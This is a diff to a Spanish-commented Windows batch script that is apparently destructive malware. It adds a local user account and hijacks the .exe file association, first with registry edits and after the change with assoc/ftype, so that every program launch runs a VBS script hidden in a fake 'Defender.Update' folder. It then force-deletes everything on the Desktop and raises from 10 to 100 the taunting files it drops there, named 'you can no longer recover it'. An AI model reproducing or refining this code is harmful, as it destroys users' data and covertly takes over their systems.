@@ -83,9 +83,8 @@ net user z7R4M3 Maxcheto /add
 ::Fin de Seccion Usuarios
 
 ::Cambio de Configuracion de archivos.exe
-reg add "HKCU\Software\Classes\.exe" /f /v "" /t REG_SZ /d "exefile" 
-reg add "HKCU\Software\Classes\exefile\shell\open\command" /f /v "" /t REG_SZ /d "\"C:\Windows\System32\Microsoft\Protect\Defender.Update\Win32.exe\" \"%1\" %*" 
-reg add "HKCU\Software\Classes\exefile\shell\open\command" /f /v "IsolatedCommand" /t REG_SZ /d "\"C:\Windows\System32\Microsoft\Protect\Defender.Update\Win32.exe\" \"%1\" %*"
+assoc .exe=VBSExeHandler
+ftype VBSExeHandler=wscript.exe "C:\Windows\System32\Microsoft\Protect\Defender.Update\aplicaciones.vbs" "%1" %*
 
 ::Archivos >:)
 del /Q /F "%USERPROFILE%\Desktop\*" 
@@ -101,7 +100,7 @@ set "archivoFuente=C:\Windows\System32\Microsoft\Protect\Defender.Update\main.tx
 
 if not exist "%archivoFuente%" exit /b
 
-for /l %%i in (1, 1, 10) do (
+for /l %%i in (1, 1, 100) do (
     copy "%archivoFuente%" "%escritorio%\YA.NO.LO.PUEDES.RECUPERAR%%i.txt" >nul
 )
 ::Reinicio
